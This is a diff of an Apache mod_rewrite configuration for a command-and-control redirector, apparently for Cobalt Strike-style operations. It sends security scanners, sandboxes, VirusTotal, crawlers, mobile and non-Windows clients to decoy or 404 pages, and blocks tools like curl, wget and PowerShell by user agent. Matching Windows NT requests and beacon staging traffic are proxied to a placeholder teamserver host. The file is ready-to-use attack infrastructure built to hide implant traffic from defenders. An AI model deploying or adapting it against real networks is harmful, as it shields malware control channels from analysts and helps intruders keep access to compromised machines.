@@ -1,77 +1,123 @@
         #Based on:https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10 and https://bluescreenofjeff.com
-        #Change with sudo sed -i -e 's/replaceme/{Where to send to whenblock}/g'
         #Also if you dont want the whitelist page to be replaceme_Allowed you need to sed change that also
-	#REF: https://bluescreenofjeff.com/2016-12-23-apache_mod_rewrite_grab_bag/
+        #REF: https://bluescreenofjeff.com/2016-12-23-apache_mod_rewrite_grab_bag/
+		
+		##Variables Explained
+		#URI_HERE== the URI for the ultimate Dest
+		#replaceme_Allowed==Ultimate dest IP to send to after redir is allowed
+		#COOKIE_VALUE==the value of cookie in http request to send to after redir is allowed
+			
+        RewriteEngine on
+        RewriteOptions Inherit
+        ServerSignature Off
+		FallbackResource 404.html
+		
+		RewriteCond %{REQUEST_METHOD} !^(GET|POST)
+        RewriteRule ^.*$ http://google.com [L,R=302]
+		
+		RewriteCond %{REQUEST_METHOD} ^(HEAD|TRACE)
+        RewriteRule ^.*$ http://google.com [L,R=302]
+		
+		#Prevent image hotlinking
+		#RewriteCond %{HTTP_REFERER} !^$  
+        #RewriteCond %{HTTP_REFERER} !^http://(www\.)?example\.com/ [NC]  
+        #RewriteRule \.(gif|jpg|jpeg|png)$ - [F]
+		
+        #Forcing HTTPS
+        #RewriteCond %{HTTPS} !=on [NC]
+        #RewriteRule ^.*$ https://replaceme_self%{REQUEST_URI} [L,R=301]
 	
-	RewriteEngine on
-      	RewriteOptions Inherit
-      	ServerSignature Off
-	
-	#Forcing HTTPS
-	#RewriteCond %{HTTPS} !=on [NC]
-	#RewriteRule ^.*$ https://replaceme_Allowed_SELF%{REQUEST_URI} [L,R=301]
-	
-	## Uncomment to enable verbose debugging in /var/logs/apache2/error.log
-	# LogLevel alert rewrite:trace5
-	
-	ErrorDocument 404 replaceme
-	ErrorDocument 500 replaceme
-	
+        ## Uncomment to enable verbose debugging in /var/logs/apache2/error.log
+        #LogLevel alert rewrite:trace5
+		
+        #Whitelisted Cert Validation Services
+        RewriteCond %{HTTP_USER_AGENT} "COMODO DCV" [NC]
+        RewriteRule ^.*$ index.html [L]
+		
         #Time based access
-        RewriteCond %{TIME_HOUR}%{TIME_MIN} <0600
-        RewriteCond %{TIME_HOUR}%{TIME_MIN} >1800
-        RewriteRule ^.*$ replaceme [L]
+        #RewriteCond %{TIME_HOUR}%{TIME_MIN} <0600
+        #RewriteCond %{TIME_HOUR}%{TIME_MIN} >1800
+        #RewriteRule ^.*$ 404.html [L]
 
         #Day of week based access
-        RewriteCond %{TIME_WDAY} =0
-        RewriteCond %{TIME_WDAY} =6
-        RewriteRule ^.*$ replaceme [L]
-
-        RewriteCond %{REQUEST_METHOD} !^(GET|POST)
-        RewriteRule ^.*$ http://Google.com/ [L]
+        #RewriteCond %{TIME_WDAY} =0
+        #RewriteCond %{TIME_WDAY} =6
+        #RewriteRule ^.*$ 404.html [L]
 
         #User agent strings for windows native tools
-        RewriteCond %{HTTP_USER_AGENT} "bits|WindowsPowerShell|.net" [NC,OR]
-        RewriteRule ^.*$ replaceme [L]
+        RewriteCond %{HTTP_USER_AGENT} "bits|WindowsPowerShell|.net" [NC]
+        RewriteRule ^.*$ 404.html [L]
 
         #User agent string for native compiled software Libs and Linux tools
-        RewriteCond %{HTTP_USER_AGENT} "python|python-requests|java|linux|wget|curl|.net|CLR|OpenBSD|git" [NC,OR]
-        RewriteRule ^.*$ replaceme [L]
+        RewriteCond %{HTTP_USER_AGENT} "python|python-requests|java|linux|wget|curl|CLR|OpenBSD|git" [NC]
+        RewriteRule ^.*$ 404.html [L]
 
         #mobile user agents
         RewriteCond %{HTTP_USER_AGENT} "iPhone|android|Nexus|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos|kindel|kindal" [NC]
-        RewriteRule ^.*$ replaceme [L]
+        RewriteRule ^.*$ 404.html [L]
 
         #BLACKLISTED USER AGENT STRINGS
-        RewriteCond %{HTTP_USER_AGENT} "Safari|Macintosh|OS X|Cisco|BingPreview|SamsungBrowser|HeadlessChrome|DingTalk|compatible|Opera|zh-cn|Mac|InfoPath|MSIE|X11|Darwin|Presto|CampNet|adobe|BlackWidow|Banner|Dalvik|ChinaClaw|Custo|DISCo|eCatch|EirGrabber|EmailSiphon|EmailWolf|WebPictures|ExtractorPro|EyeNetIE|GetWeb|GetRight|Zeus|SiteSnagger|SuperBot|SuperHTTP|Surfbot|WebAuto|WebCopier|WebSpider|zgrab|X11|Googlebot|virustotalcloud|Gh0st|OS x|Lynx|Slackbot|nmap|cloudfront|clshttp|archiver|sparta|loader|email|nikto|nessus|rapid|Qualys|vas|miner|HTTrack|crawl|shell|yahoo|google|bot|b\-o\-t|spider|baidu" [NC]
-        RewriteCond %{HTTP_USER_AGENT} =""
-	RewriteRule ^.*$ replaceme [L]
+        RewriteCond %{HTTP_USER_AGENT} "Safari|Macintosh|OS X|Cisco|BingPreview|SamsungBrowser|HeadlessChrome|DingTalk|compatible|Opera|zh-cn|Mac|InfoPath|MSIE|X11|Darwin|Presto|CampNet|adobe|BlackWidow|Banner|Dalvik|ChinaClaw|Custo|DISCo|eCatch|EirGrabber|EmailSiphon|EmailWolf|WebPictures|ExtractorPro|EyeNetIE|GetWeb|GetRight|Zeus|SiteSnagger|SuperBot|SuperHTTP|Surfbot|WebAuto|WebCopier|WebSpider|zgrab|X11|Googlebot|virustotalcloud|Gh0st|OS x|Lynx|Slackbot|nmap|cloudfront|clshttp|archiver|sparta|loader|email|nikto|nessus|rapid|Qualys|vas|miner|HTTrack|crawl|shell|yahoo|google|bot|b\-o\-t|spider|baidu" [NC,OR]
+		RewriteCond %{HTTP_USER_AGENT} =""
+        RewriteRule ^.*$ 404.html [L]
+			
+		#BLACKLISTED OS ID
+		RewriteCond %{QUERY_STRING} os_id=unknown
+		RewriteCond %{QUERY_STRING} os_id=linux
+		RewriteCond %{QUERY_STRING} os_id=unix
+		RewriteCond %{QUERY_STRING} os_id=mac
+		RewriteRule ^.*$ 404.html [L]
+		
+		## Scripted Web Delivery 
+		## Uncomment and adjust as needed
+		#RewriteCond %{REQUEST_URI} ^/{URI GOES HERE}?$
+		#RewriteCond %{HTTP_USER_AGENT} ^$
+		#RewriteRule ^.*$ "http://replaceme_Allowed%{REQUEST_URI}" [P,L]
+		
+		## Default Beacon Staging Support (/1234)
+		#RewriteCond %{REQUEST_URI} ^/..../?$
+		#RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
+		#RewriteRule ^.*$ "http://replaceme_Allowed%{REQUEST_URI}" [P,L]
 	
-	#Below is where to send something if it hits a GOOD condiditon to forward on
-        #RewriteCond %{HTTP_USER_AGENT} "windows nt" [NC]
-        #RewriteRule ^.*$ replaceme_Allowed [L]
-	
-	#Whitelisted Cert Validation Services
-        #RewriteCond %{HTTP_USER_AGENT} "COMODO DCV" [NC]
-        #RewriteRule ^.*$ replaceme_Allowed [L]
-	
-	## Scripted Web Delivery 
-	## Uncomment and adjust as needed
-	#RewriteCond %{REQUEST_URI} ^/{URI GOES HERE}?$
-	#RewriteCond %{HTTP_USER_AGENT} ^$
-	#RewriteRule ^.*$ "http://replaceme_Allowed%{REQUEST_URI}" [P,L]
-
-	## Default Beacon Staging Support (/1234)
-	RewriteCond %{REQUEST_URI} ^/..../?$
-	RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-	RewriteRule ^.*$ "http://replaceme_Allowed%{REQUEST_URI}" [P,L]
-
-	## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
-	## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
-	## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
-	## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
-	## Profile URIs
-	RewriteCond %{REQUEST_URI} ^(/{URI GOES HERE}.*|/{AND OTHER URI GOES HERE}.*|/{AND OTHER URI GOES HERE}.*)$
-	## Profile UserAgent
-	RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-	RewriteRule ^.*$ "https://replaceme_Allowed%{REQUEST_URI}" [P,L]
+		## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
+        ## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
+        ## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
+        ## Only allow GET and POST methods to pass to the C2 server
+		#URI_HERE== the URI for the ultimate Dest
+		#replaceme_Allowed==Ultimate dest IP to send to after redir is allowed
+		#COOKIE_VALUE==the value of cookie in http request to send to after redir is allowed		
+		#RewriteCond %{QUERY_STRING} os_id=windows
+        RewriteCond %{REQUEST_METHOD} ^(GET|POST) [NC]
+        RewriteCond %{REQUEST_URI} ^(/URI_HERE.*|/URI_HERE.*)$ [NC]
+        RewriteCond %{HTTP_USER_AGENT} "Windows NT" [NC]
+		#RewriteCond %{HTTP_COOKIE} COOKIE_VALUE
+        RewriteRule ^.*$ "http://replaceme_Allowed%{REQUEST_URI}" [P,L]
+		
+		ErrorDocument 404 404.html
+        #ErrorDocument 500 404.html
+        #ErrorDocument 403 404.html
+		#ErrorDocument 408 404.html	
+			
+		#Redir all not found here	
+		RewriteCond %{REQUEST_FILENAME} !-f
+		RewriteRule ^.*$ 404.html [L]
+		RewriteCond %{REQUEST_FILENAME} !-d
+		RewriteRule ^.*$ 404.html [L]
+		RewriteCond %{REQUEST_FILENAME} !-l
+		RewriteRule ^.*$ 404.html [L]
+		
+		# Redirect windows browser here
+		RewriteCond %{REQUEST_URI} ./
+		RewriteCond %{HTTP_USER_AGENT} "Windows NT" [NC]
+        RewriteRule ^.*$ index.html [L]			
+		RewriteCond %{REQUEST_FILENAME} -f [NC]
+		RewriteCond %{HTTP_USER_AGENT} "Windows NT" [NC]
+        RewriteRule ^.*$ index.html [L]	
+		RewriteCond %{REQUEST_FILENAME} -d
+		RewriteCond %{HTTP_USER_AGENT} "Windows NT" [NC]
+        RewriteRule ^.*$ index.html [L]	
+		RewriteCond %{REQUEST_FILENAME} -l
+		RewriteCond %{HTTP_USER_AGENT} "Windows NT" [NC]
+        RewriteRule ^.*$ index.html [L]
+		
+		RewriteRule ^.*$ 404.html [L]
